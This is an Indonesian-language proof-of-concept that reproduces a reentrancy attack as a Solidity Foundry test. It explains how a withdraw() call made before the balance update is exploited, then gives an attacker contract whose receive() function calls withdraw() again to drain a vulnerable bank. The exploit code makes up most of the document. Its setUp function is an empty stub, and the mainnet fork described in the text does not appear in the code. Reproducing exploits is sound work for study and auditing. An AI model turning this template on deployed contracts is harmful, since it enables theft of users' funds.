### Foundry Exploit PoC: Reentrancy Attack Reproduction
Reproduksi insiden reentrancy menggunakan Foundry `forge test` dengan forking blok spesifik di Ethereum mainnet sebelum insiden terjadi.

#### Vektor Kerentanan:
Kerentanan terjadi ketika kontrak target melakukan transfer ETH eksternal via low-level `call()` sebelum memperbarui balance pengguna (pelanggaran Checks-Effects-Interactions pattern). Kontrak penyerang mencegat eksekusi melalui fallback/receive function dan memanggil ulang fungsi penarikan sebelum state balance di-nol-kan.

#### Implementasi Foundry Test:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyExploit is Test {
    IVulnerableBank public bank;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy target dan inisialisasi state
    }

    function testReentrancyDrain() public {
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        AttackContract attack = new AttackContract(address(bank));
        attack.pwn{value: 1 ether}();
        assertGt(address(attack).balance, 1 ether);
        vm.stopPrank();
    }
}

contract AttackContract {
    IVulnerableBank public immutable bank;
    constructor(address _bank) { bank = IVulnerableBank(_bank); }
    function pwn() external payable { bank.deposit{value: msg.value}(); bank.withdraw(); }
    receive() external payable { if (address(bank).balance >= 1 ether) { bank.withdraw(); } }
}
```

